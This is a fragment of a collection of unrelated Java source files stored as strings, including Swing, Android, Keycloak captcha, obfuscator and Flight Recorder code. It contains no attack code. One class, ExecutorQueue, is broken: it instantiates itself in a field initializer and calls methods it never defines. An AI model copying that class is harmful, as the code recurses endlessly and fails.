courseNameFields = new ArrayList<>(); \r\n\r\n        for (int i = 0; i < totalCourses; i++) {\r\n            JPanel coursePanel = new JPanel(new FlowLayout());\r\n            coursePanel.setBackground(Color.gray);\r\n            JTextField courseNameField = new JTextField(10);\r\n            JComboBox<Integer> creditHoursComboBox = new JComboBox<>();\r\n            for (int j = 1; j <= 5; j++) {\r\n                creditHoursComboBox.addItem(j);\r\n            }\r\n            JComboBox<String> gradeComboBox = new JComboBox<>(GRADES);\r\n\r\n            creditHoursComboBoxes.add(creditHoursComboBox);\r\n            gradeComboBoxes.add(gradeComboBox);\r\n            courseNameFields.add(courseNameField); // Add to the list\r\n\r\n            coursePanel.add(new JLabel(\"Course \" + (i + 1) + \":\"));\r\n            coursePanel.",
    "package dev.skidfuscator.obfuscator.frame_V2.frame;\n\nimport com.google.common.collect.Streams;\nimport dev.skidfuscator.obfuscator.Skidfuscator;\nimport dev.skidfuscator.obfuscator.skidasm.SkidClassNode;\nimport dev.skidfuscator.obfuscator.skidasm.SkidExpressionPool;\nimport dev.skidfuscator.obfuscator.skidasm.SkidMethodNode;\nimport dev.skidfuscator.obfuscator.skidasm.SkidTypeStack;\nimport dev.skidfuscator.obfuscator.skidasm.cfg.SkidBlock;\nimport dev.skidfuscator.obfuscator.util.TypeUtil;\nimport dev.skidfuscator.obfuscator.util.misc.Parameter;\nimport org.mapleir.asm.ClassNode;\nimport org.mapleir.flowgraph.ExceptionRange;\nimport org.mapleir.flowgraph.edges.FlowEdge;\nimport org.mapleir.flowgraph.edges.TryCatchEdge;\nimport org.mapleir.ir.cfg.BasicBlock;\nimport org.mapleir.ir.cfg.ControlFlowGraph;\nimport org.mapleir.ir.code.Expr;\nimport org.mapleir.ir.code.Stmt;\nimport org.mapleir.ir.code.TypeStack;\nimport org.mapleir.ir.code.expr.CaughtExceptionExpr;\nimport org.mapleir.ir.code.expr.ConstantExpr;\nimport org.mapleir.ir.code.expr.InstanceofExpr;\nimport org.mapleir.ir.code.expr.VarExpr;\nimport org.mapleir.ir.code.stmt.ConditionalJumpStmt;\nimport org.mapleir.ir.code.stmt.SwitchStmt;\nimport org.mapleir.ir.code.stmt.ThrowStmt;\nimport org.mapleir.ir.code.stmt.UnconditionalJumpStmt;\nimport org.mapleir.ir.code.stmt.copy.CopyVarStmt;\nimport dev.skidfuscator.obfuscator.frame_V2.frame.type.TypeHeader;\nimport org.mapleir.ir.utils.CFGExporterUtils;\nimport org.mapleir.ir.utils.CFGUtils;\nimport org.mapleir.propertyframework.api.IPropertyDictionary;\nimport org.mapleir.propertyframework.impl.BooleanProperty;\nimport org.mapleir.propertyframework.util.PropertyHelper;\nimport org.objectweb.asm.ClassReader;\nimport org.objectweb.asm.Type;\n\nimport java.io.IOException;\nimport java.util.*;\nimport java.util.function.Predicate;\nimport java.util.stream.Collectors;\n\npublic class FrameComputer {\n    private final Skidfuscator skidfuscator;\n    public static final int FLAG_CONFLICT = 0x1;\n\n    public FrameComputer(Skidfuscator skidfuscator) {\n        this.skidfuscator = skidfuscator;\n    }\n\n    public void compute(final ControlFlowGraph cfg) {\n        if (cfg.getEntries().size() != 1)\n            throw new IllegalStateException(\"CFG doesn't have exactly 1 entry\");\n\n        \n\n        final BasicBlock entry = cfg.getEntries().iterator().next();\n        final boolean isInit = cfg.getMethodNode().isInit();\n\n        final FrameGraph frameGraph = new FrameGraph();\n\n        final Map<BasicBlock, FrameNode> frameMap = new HashMap<>();\n\n        /*\n         * Create a hot cache for a frame node for every\n         * frame assigned per block, then add it to the\n         * flame flow graph cuz it's useful for debugging.\n         */\n        for (BasicBlock vertex : cfg.vertices()) {\n            final TypeHeader pool = new TypeHeader(\n                    new Type[cfg.getLocals().getMaxLocals() + 2]\n            );\n\n            final FrameNode frameNode = new FrameNode(vertex, pool);\n            frameMap.put(\n                    vertex,\n                    frameNode\n            );\n            frameGraph.addVertex(frameNode);\n        }\n\n        final FrameNode entryFrame = frameMap.get(entry);\n\n        /*\n         * This is just shit for iterating.\n         */\n        final Set<BasicBlock> visited = new HashSet<>();\n        final Stack<BasicBlock> bucket = new Stack<>();\n\n        /*\n         * FRAME LOCALS\n         */\n        bucket.add(entry);\n\n        /*\n         * At the beginning, lets assume every variable has\n         * no definition\n         */\n        entryFrame.fill(TypeUtil.UNDEFINED_TYPE);\n        frameGraph.getEntries().add(entryFrame);\n\n        int index = 0;\n        int protectedIndex = 0;\n\n        /*\n         * If the method is a non static, then it has a def\n         * of \"this.\" which is itself\n         */\n        if (!cfg.getMethodNode().isStatic()) {\n            if (isInit) {\n                ((SkidMethodNode) cfg.getMethodNode()).getEntryBlock();\n                frameMap.forEach((block, frame) -> {\n                    entryFrame.set(0,\n                            block.isFlagSet(SkidBlock.FLAG_NO_OPAQUE)\n                            ? TypeUtil.UNINITIALIZED_THIS\n                            : cfg.getMethodNode().getOwnerType()\n                    );\n                });\n            } else {\n                entryFrame.set(index, Type.getType(\"L\" + cfg.getMethodNode().owner.getName() + \";\"));\n            }\n            protectedIndex = index;\n            index++;\n        }\n\n        /*\n         * Every method parameter reserves either:\n         * - 2 slots of locals for double and long types\n         * - 1 slot of locals for the rest\n         */\n        final Parameter parameter = new Parameter(cfg.getDesc());\n        for (int i = 0; i < parameter.getArgs().size(); i++) {\n            Type type = parameter.getArg(i);\n\n            if (type == Type.BOOLEAN_TYPE\n                    || type == Type.BYTE_TYPE\n                    || type == Type.CHAR_TYPE\n    ",
    "package com.lx862.quitgame;\n\nimport java.util.LinkedList;\nimport java.util.stream.Collectors;\n\npublic class ReorderableSplashText {\n    public String text;\n    public LinkedList<SplashTextCharacter> chars;\n    public ReorderableSplashText(String text) {\n        this.text = text;\n        chars = new LinkedList<>();\n        for(int i = 0; i < text.length(); i++) {\n            chars.add(new SplashTextCharacter(text.charAt(i)));\n        }\n    }\n\n    public void reorder(SplashTextCharacter object, int idx) {\n        int fromIndex = chars.indexOf(object);\n        if(fromIndex == idx) return;\n        if(idx < 0) return;\n\n        boolean forward = idx > fromIndex;\n        chars.remove(fromIndex);\n\n        if(forward) {\n            if(idx+1 > chars.size()) {\n                chars.add(object);\n            } else {\n                chars.add(idx+1, object);\n            }\n        } else {\n            chars.add(idx, object);\n        }\n    }\n\n    public boolean startsWith(String str) {\n        String formedStr = chars.stream().map(e -> String.valueOf(e.getChar())).collect(Collectors.joining());\n        return formedStr.trim().toLowerCase().startsWith(str.toLowerCase());\n    }\n}",
    "package com.jblue.kv.executor;\n\nimport java.util.concurrent.LinkedTransferQueue;\n/**\n * LinkedTransferQueue \u80fd\u4fdd\u8bc1\u66f4\u9ad8\u6027\u80fd\uff0c\u76f8\u6bd4\u4e0eLinkedBlockingQueue\u6709\u660e\u663e\u63d0\u5347\n * 1) \u4e0d\u8fc7LinkedTransferQueue\u7684\u7f3a\u70b9\u662f\u6ca1\u6709\u961f\u5217\u957f\u5ea6\u63a7\u5236\uff0c\u9700\u8981\u5728\u5916\u5c42\u534f\u52a9\u63a7\u5236\n */\npublic class ExecutorQueue  extends LinkedTransferQueue<Runnable> {\n    final ExecutorQueue executorQueue = new ExecutorQueue();\n\n    public ExecutorQueue() {\n        super();\n    }\n\n    public void setStandardThreadExecutor(StandardThreadExecutor threadPoolExecutor) {\n        executorQueue.setStandardThreadExecutor(threadPoolExecutor);\n    }\n\n    // \u6ce8\uff1a\u4ee3\u7801\u6765\u6e90\u4e8e tomcat\n    public boolean force(Runnable o) {\n        // forces the item onto the queue, to be used if the task is rejected\n        return executorQueue.force(o);\n    }\n\n    @Override\n    public boolean offer(Runnable o) {\n\n        // we are maxed out on threads, simply queue the object\n        // we have idle threads, just add it to the queue\n        // note that we don't use getActiveCount(), see BZ 49730\n        // if we have less threads than maximum force creation of a new\n        // thread\n        // if we reached here, we need to add it to the queue\n        return executorQueue.offer(o);\n    }\n}",
    "/*\npackage com.example.myfirstapplication;\n\nimport android.os.Bundle;\nimport android.text.TextUtils;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.Toast;\nimport androidx.annotation.NonNull;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.Fragment;\nimport com.google.firebase.auth.FirebaseAuth;\nimport com.google.firebase.auth.FirebaseUser;\n\npublic class RegisterFragment extends Fragment {\n\n    private FirebaseAuth mAuth; // \u58f0\u660e\u4e00\u4e2aFirebaseAuth\u5b9e\u4f8b\n\n    @Nullable\n    @Override\n    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.register, container, false);\n    }\n\n    @Override\n    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n\n        mAuth = FirebaseAuth.getInstance(); // \u521d\u59cb\u5316FirebaseAuth\u5b9e\u4f8b\n\n        EditText editTextEmail = view.findViewById(R.id.registerUsernameEditText);\n        EditText editTextPassword = view.findViewById(R.id.registerPasswordEditText);\n        Button buttonRegister = view.findViewById(R.id.registerButton);\n\n        buttonRegister.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                String email = editTextEmail.getText().toString().trim();\n                String password = editTextPassword.getText().toString().trim();\n\n                // \u786e\u4fdd\u90ae\u7bb1\u548c\u5bc6\u7801\u4e0d\u4e3a\u7a7a\n                if (!TextUtils.isEmpty(email) && !TextUtils.isEmpty(password)) {\n                    // \u4f7f\u7528FirebaseAuth\u521b\u5efa\u7528\u6237\n                    mAuth.createUserWithEmailAndPassword(email, password)\n                            .addOnCompleteListener(getActivity(), task -> {\n                                if (task.isSuccessful()) {\n                                    // \u6ce8\u518c\u6210\u529f\n                                    FirebaseUser user = mAuth.getCurrentUser();\n                                    Toast.makeText(getActivity(), \"\u6ce8\u518c\u6210\u529f\", Toast.LENGTH_SHORT).show();\n\n                                    // \u53ef\u9009\uff1a\u66f4\u65b0UI\u6216\u8df3\u8f6c\u5230\u5176\u4ed6Fragment\u6216Activity\n                                } else {\n                                    // \u6ce8\u518c\u5931\u8d25\n                                    Toast.makeText(getActivity(), \"\u6ce8\u518c\u5931\u8d25\uff1a\" + task.getException().getMessage(), Toast.LENGTH_SHORT).show();\n                                }\n                            });\n                } else {\n                    Toast.makeText(getActivity(), \"\u90ae\u7bb1\u548c\u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a\", Toast.LENGTH_SHORT).show();\n                }\n            }\n        });\n    }\n}\n\n*/\n",
    "package com.example.memorand;\n\nimport android.os.Bundle;\n\nimport androidx.fragment.app.Fragment;\n\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n\n/**\n * A simple {@link Fragment} subclass.\n * Use the {@link ThirdFragment#newInstance} factory method to\n * create an instance of this fragment.\n */\npublic class ThirdFragment extends Fragment {\n\n    // TODO: Rename parameter arguments, choose names that match\n    // the fragment initialization parameters, e.g. ARG_ITEM_NUMBER\n    private static final String ARG_PARAM1 = \"param1\";\n    private static final String ARG_PARAM2 = \"param2\";\n\n    // TODO: Rename and change types of parameters\n    private String mParam1;\n    private String mParam2;\n\n    public ThirdFragment() {\n        // Required empty public constructor\n    }\n\n    /**\n     * Use this factory method to create a new instance of\n     * this fragment using the provided parameters.\n     *\n     * @param param1 Parameter 1.\n     * @param param2 Parameter 2.\n     * @return A new instance of fragment ThirdFragment.\n     */\n    // TODO: Rename and change types and number of parameters\n    public static ThirdFragment newInstance(String param1, String param2) {\n        ThirdFragment fragment = new ThirdFragment();\n        Bundle args = new Bundle();\n        args.putString(ARG_PARAM1, param1);\n        args.putString(ARG_PARAM2, param2);\n        fragment.setArguments(args);\n        return fragment;\n    }\n\n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        if (getArguments() != null) {\n            mParam1 = getArguments().getString(ARG_PARAM1);\n            mParam2 = getArguments().getString(ARG_PARAM2);\n        }\n    }\n\n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.fragment_third, container, false);\n    }\n}",
    "package dev.xdark.versionchanger;\r\n\r\nimport java.io.DataInputStream;\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.io.PushbackInputStream;\r\nimport java.lang.invoke.MethodHandles;\r\nimport java.lang.invoke.VarHandle;\r\nimport java.nio.ByteOrder;\r\n\r\npublic abstract class VersionChanger {\r\n\tprivate static final VarHandle VH_INT = MethodHandles.byteArrayViewVarHandle(int[].class, ByteOrder.BIG_ENDIAN);\r\n\tprivate static final VarHandle VH_SHORT = MethodHandles.byteArrayViewVarHandle(short[].class, ByteOrder.BIG_ENDIAN);\r\n\tstatic final int HEADER = 0xcafebabe;\r\n\r\n\tpublic InputStream change(InputStream in) throws IOException {\r\n\t\tDataInputStream dis = new DataInputStream(in);\r\n\t\tif (HEADER != dis.readInt()) {\r\n\t\t\tthrow new IOException(\"Stream does not start with %s\".formatted(Integer.toHexString(HEADER)));\r\n\t\t}\r\n\t\tint minorVersion = dis.readUnsignedShort();\r\n\t\tint majorVersion = dis.readUnsignedShort();\r\n\t\tVersionChange versionChange = changeVersion(majorVersion, minorVersion);\r\n\t\tPushback pushback = new Pushback(in);\r\n\t\tbyte[] buf = new byte[4 + 2 + 2];\r\n\t\tVH_INT.set(buf, 0, HEADER);\r\n\t\tVH_SHORT.set(buf, 4, (short) versionChange.minorVersion());\r\n\t\tVH_SHORT.set(buf, 6, (short) versionChange.majorVersion());\r\n\t\tpushback.set(buf);\r\n\t\treturn pushback;\r\n\t}\r\n\r\n\tprotected abstract VersionChange changeVersion(int majorVersion, int minorVersion);\r\n\r\n\tprivate static final class Pushback extends PushbackInputStream {\r\n\r\n\t\tpublic Pushback(InputStream in) {\r\n\t\t\tsuper(in, 1);\r\n\t\t}\r\n\r\n\t\tvoid set(byte[] buf) {\r\n\t\t\tthis.buf = buf;\r\n\t\t\tpos = 0;\r\n\t\t}\r\n\t}\r\n}\r\n",
    "/*\n * Copyright 2016 Red Hat, Inc. and/or its affiliates\n * and other contributors as indicated by the @author tags.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.captchafox.keycloak.authenticator;\n\nimport org.apache.http.NameValuePair;\nimport org.apache.http.client.entity.UrlEncodedFormEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.message.BasicNameValuePair;\nimport org.apache.http.util.EntityUtils;\nimport org.jboss.logging.Logger;\nimport org.keycloak.Config.Scope;\nimport org.keycloak.authentication.FormAction;\nimport org.keycloak.authentication.FormActionFactory;\nimport org.keycloak.authentication.FormContext;\nimport org.keycloak.authentication.ValidationContext;\nimport org.keycloak.connections.httpclient.HttpClientProvider;\nimport org.keycloak.events.Details;\nimport org.keycloak.events.Errors;\nimport org.keycloak.forms.login.LoginFormsProvider;\nimport org.keycloak.models.*;\nimport org.keycloak.models.utils.FormMessage;\nimport org.keycloak.provider.ProviderConfigProperty;\nimport org.keycloak.services.ServicesLogger;\nimport org.keycloak.services.messages.Messages;\nimport org.keycloak.services.validation.Validation;\nimport org.keycloak.util.JsonSerialization;\n\nimport jakarta.ws.rs.core.MultivaluedMap;\n\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RegistrationCaptchaFox implements FormAction, FormActionFactory {\n    private static final Logger LOGGER = Logger.getLogger(RegistrationCaptchaFox.class);\n    public static final String CAPTCHA_RESPONSE_KEY = \"cf-captcha-response\";\n    public static final String REFERENCE_CATEGORY = \"captchafox\";\n    public static final String SITE_KEY = \"site.key\";\n    public static final String SITE_SECRET = \"secret\";\n\n    public static final String PROVIDER_ID = \"registration-captchafox-action\";\n\n    @Override\n    public void close() {\n\n    }\n\n    @Override\n    public FormAction create(KeycloakSession session) {\n        return this;\n    }\n\n    @Override\n    public void init(Scope config) {\n\n    }\n\n    @Override\n    public void postInit(KeycloakSessionFactory factory) {\n\n    }\n\n    @Override\n    public String getId() {\n        return PROVIDER_ID;\n    }\n\n    @Override\n    public String getDisplayType() {\n        return \"CaptchaFox\";\n    }\n\n    @Override\n    public String getReferenceCategory() {\n        return REFERENCE_CATEGORY;\n    }\n\n    @Override\n    public boolean isConfigurable() {\n        return true;\n    }\n\n    @Override\n    public AuthenticationExecutionModel.Requirement[] getRequirementChoices() {\n        return new AuthenticationExecutionModel.Requirement[] {\n                AuthenticationExecutionModel.Requirement.REQUIRED,\n                AuthenticationExecutionModel.Requirement.DISABLED\n        };\n    }\n\n    @Override\n    public boolean isUserSetupAllowed() {\n        return false;\n    }\n\n    @Override\n    public String getHelpText() {\n        return \"Adds CaptchaFox button. CaptchaFox verifies that the entity that is registering is a human.  This can only be used on the internet and must be configured after you add it.\";\n    }\n\n    @Override\n    public void buildPage(FormContext context, LoginFormsProvider form) {\n        AuthenticatorConfigModel captchaConfig = context.getAuthenticatorConfig();\n        String userLanguageTag = context.getSession().getContext().resolveLocale(context.getUser()).toLanguageTag();\n\n        if (captchaConfig == null || captchaConfig.getConfig() == null\n                || captchaConfig.getConfig().get(SITE_KEY) == null\n                || captchaConfig.getConfig().get(SITE_SECRET) == null) {\n            form.addError(new FormMessage(null, Messages.RECAPTCHA_NOT_CONFIGURED));\n            return;\n        }\n\n        String siteKey = captchaConfig.getConfig().get(SITE_KEY);\n        String mode = captchaConfig.getConfig().get(\"mode\");\n        form.setAttribute(\"captchaFoxRequired\", true);\n        form.setAttribute(\"captchaFoxMode\", mode);\n        form.setAttribute(\"captchaFoxSiteKey\", siteKey);\n        form.addScript(\"https://cdn.captchafox.com/api.js?lang=\" + userLanguageTag);\n\n    }\n\n    @Override\n    public void validate(ValidationContext context) {\n        MultivaluedMap<String, String> formData = context.getHttpRequest().getDecodedFormParameters();\n        Li",
    "package br.com.poo.util;\n\nimport java.util.logging.ConsoleHandler;\nimport java.util.logging.Formatter;\nimport java.util.logging.Handler;\nimport java.util.logging.LogRecord;\nimport java.util.logging.Logger;\n\npublic class Util {\n\t\n\t// Cria uma inst\u00e2ncia do Logger com o nome da classe Util\n\t\tprivate static Logger logger = Logger.getLogger(Util.class.getName());\n\n\t\t// Construtor privado para evitar a instancia\u00e7\u00e3o da classe Util\n\t\tprivate Util() {\n\t\t\t// Lan\u00e7a uma exce\u00e7\u00e3o IllegalStateException se algu\u00e9m tentar criar uma inst\u00e2ncia desta classe\n\t\t\tthrow new IllegalStateException(Util.class.getName());\n\t\t}\n\t\t\n\t\t// Configura e retorna um Logger personalizado\n\t\tpublic static Logger setupLogger() {\n\t\t\t// Desativa o uso dos Handlers do Logger pai (se houver algum)\n\t\t\tlogger.setUseParentHandlers(false);\n\t\t\t\n\t\t\t// Cria um ConsoleHandler personalizado\n\t\t\tConsoleHandler customHandler = new ConsoleHandler();\n\t\t\t\n\t\t\t// Define um Formatter personalizado para o ConsoleHandler\n\t\t\tcustomHandler.setFormatter(new Formatter() {\n\t\t\t\t@Override\n\t\t\t\tpublic String format(LogRecord rec) {\n\t\t\t\t\t// Define o formato da mensagem de log a ser exibida no console\n\t\t\t\t\treturn rec.getMessage() + \"\\n\";\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t\t// Adiciona o ConsoleHandler personalizado ao Logger\n\t\t\tlogger.addHandler(customHandler);\n\t\t\t\n\t\t\t// Retorna o Logger configurado\n\t\t\treturn logger;\n\t\t}\n\t\t\n\t\t// Remove todos os Handlers extras do Logger\n\t\tpublic static void customizer() {\n\t\t\tif(logger.getHandlers().length > 1) {\n\t\t\t\tfor(Handler log : logger.getHandlers()) {//iteracao\n\t\t\t\t\tlogger.removeHandler(log);\n\t\t\t\t\tif(logger.getHandlers().length == 1) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n}\n",
    "/*\n * Copyright (C) 2024-2026 Jidcoo(https://github.com/jidcoo).\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage io.github.jidcoo.opto.lcdb.enhancer.core.printer;\n\nimport io.github.jidcoo.opto.lcdb.enhancer.base.BasePrintingStrategy;\nimport io.github.jidcoo.opto.lcdb.enhancer.base.Strategizable;\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.AssertUtil;\nimport io.github.jidcoo.opto.lcdb.enhancer.utils.GsonUtil;\nimport io.github.jidcoo.opto.lcdb.enhancer.base.Order;\n\nimport javax.lang.model.type.NullType;\nimport java.util.*;\nimport java.util.function.BiConsumer;\nimport java.util.stream.Collectors;\n\n/**\n * <p>OutputPrinter is an output printer.</p>\n *\n * <p>OutputPrinter performs appropriate printing of\n * output objects based on built-in printing strategies\n * and external printing strategies by\n * {@link #print(Object, Class)}.\n * </p>\n *\n * <p>And also OutputPrinter is a great {@link BasePrintingStrategy}\n * that it can print the {@link Object}, the {@link Void}\n * and the {@link NullType} value.\n * </p>\n *\n * @author Jidcoo\n * @see BasePrintingStrategy\n * @since 1.0\n */\nfinal class OutputPrinter extends BasePrintingStrategy<Object> {\n\n    /**\n     * Store all available PrintingStrategy objects.\n     *\n     * <p>The key is the output object class to which\n     * this PrintingStrategy applies.\n     * </p>\n     *\n     * <p>The value is a set of strategy with the same accepted type.\n     * And the set is sorted the priority of strategy based on\n     * {@code getOrder()}.\n     * </p>\n     */\n    private final Map<Class<?>, Set<BasePrintingStrategy<?>>> printingStrategyMap;\n\n    /**\n     * Create a OutputPrinter instance.\n     *\n     * @param printingStrategyList the available PrintingStrategy list.\n     */\n    OutputPrinter(List<BasePrintingStrategy> printingStrategyList) {\n        this.printingStrategyMap = new HashMap<>();\n        // OutputPrinter is also a PrintingStrategy class, so add it to the printingStrategyList.\n        printingStrategyList.add(this);\n        // Filter out all null object.\n        printingStrategyList = printingStrategyList.stream().filter(Objects::nonNull).collect(Collectors.toList());\n        // Define the PrintingStrategy Comparator.\n        Comparator<Order> printingStrategyComparator = Comparator.comparingInt(Order::getOrder).reversed();\n        // Wrap the printingStrategyMap build process as a BiConsumer.\n        BiConsumer<Class<?>, BasePrintingStrategy<?>> mapBuilder = (Class<?> clazz,\n                                                                    BasePrintingStrategy<?> printingStrategy) -> {\n            AssertUtil.nonNull(clazz, \"The accepted type of the \" + printingStrategy + \" cannot be null.\");\n            // Get the strategySet by clazz.\n            Set<BasePrintingStrategy<?>> strategySet = printingStrategyMap.computeIfAbsent(clazz,\n                    key -> new TreeSet<>(printingStrategyComparator));\n            // Add the printingStrategy to the set.\n            strategySet.add(printingStrategy);\n        };\n        // Using printingStrategyList to build printingStrategyMap.\n        for (BasePrintingStrategy<?> printingStrategy : printingStrategyList) {\n            mapBuilder.accept(printingStrategy.getAcceptableType(), printingStrategy);\n        }\n        // Make OutputPrinter can do the most great things. HaHaHa...\n        Arrays.asList(Object.class, NullType.class, Void.class).forEach(type -> mapBuilder.accept(type, this));\n    }\n\n    /**\n     * Print the output by appropriate strategies.\n     *\n     * @param output     the output instance.\n     * @param outputType the output type.\n     * @return the printed content.\n     */\n    String print(Object output, Class outputType) {\n        // Find the strategy set for the output.\n        Set<BasePrintingStrategy<?>> strategySet = findStrategySet(Objects.nonNull(outputType) ? outputType : output,\n                printingStrategyMap);\n        Throwable lastThrowable = null;\n        for (BasePrintingStrategy<?> printingStrategy : strategySet) {\n            try {\n                return printingStrategy.accept(null, output, printingStrategyMap);\n            } catch (Throwable e) {\n                lastThrowable = e;\n            }\n        }\n        throw new RuntimeException(\"Cannot print output :\" + output, lastThrowable);\n    }\n\n    /**\n     * Get the order of the object.\n     *\n     * @return the int order of the object.\n     */\n    @Override\n    public int getOrder() {\n        // The priority of this strate",
    "package application;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.Comparator;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Scanner;\nimport java.util.stream.Collectors;\n\nimport entities.Product;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tSystem.out.print(\"Enter full file path: \");\n\t\tString path = sc.nextLine();\n\t\t\n\t\ttry(BufferedReader br = new BufferedReader(new FileReader(path))){\n\t\t\t\n\t\t\tList<Product> list = new ArrayList<>();\n\t\t\t\n\t\t\tString line = br.readLine();\n\t\t\twhile(line != null) {\n\t\t\t\tString[] fields = line.split(\",\");\n\t\t\t\tlist.add(new Product(fields[0], Double.parseDouble(fields[1])));\n\t\t\t\tline = br.readLine();\n\t\t\t}\n\t\t\t\n\t\t\tdouble avg = list.stream()\n\t\t\t\t\t.map(p -> p.getPrice())\n\t\t\t\t\t.reduce(0.0, (x,y) -> x + y) / list.size();\n\t\t\tSystem.out.println(\"Average price: \" + String.format(\"%.2f\", avg));\n\t\t\t\n\t\t\tComparator<String> comp = (s1, s2) -> s1.toUpperCase().compareTo(s2.toUpperCase());\n\t\t\t\n\t\t\tList<String> names = list.stream()\n\t\t\t\t\t.filter(p -> p.getPrice() < avg)\n\t\t\t\t\t.map(p -> p.getName())\n\t\t\t\t\t.sorted(comp.reversed())\n\t\t\t\t\t.collect(Collectors.toList());\n\t\t\t\n\t\t\tnames.forEach(System.out::println);\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\"Error: \" + e.getMessage());\n\t\t}\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
    "/*\n * Copyright (C) 2024 Marcus Hirt\n *                    www.hirt.se\n *\n * This software is free:\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESSED OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n * Copyright (C) Marcus Hirt, 2024\n */\npackage se.hirt.recgen.recordings;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.time.Instant;\n\nimport org.openjdk.jmc.flightrecorder.writer.api.Recording;\nimport org.openjdk.jmc.flightrecorder.writer.api.Type;\n\nimport se.hirt.recgen.RecordingGenerator;\nimport se.hirt.recgen.Utils;\n\n/**\n * Recording with a large PID Process.\n */\npublic class LargePIDRecording implements RecordingGenerator {\n\n\t@Override\n\tpublic void generateRecording(File destinationFolder, String recordingName) throws IOException {\n\t\ttry (Recording defaultRecording = Utils.createDefaultRecording(destinationFolder, recordingName, 32434212L)) {\n\t\t\tType type = Utils.registerSystemProcess(defaultRecording);\n\t\t\tUtils.writeSystemProcessEvent(defaultRecording, type, \"Very long command line for the process running JMC...\",\n\t\t\t\t\tInstant.now().minusSeconds(493).toEpochMilli(), String.valueOf(32434212L));\n\t\t\tUtils.writeSystemProcessEvent(defaultRecording, type, \"Large PID Process\",\n\t\t\t\t\tInstant.now().minusSeconds(493).toEpochMilli(), String.valueOf(32434213L));\n\t\t}\n\t}\n}\n",
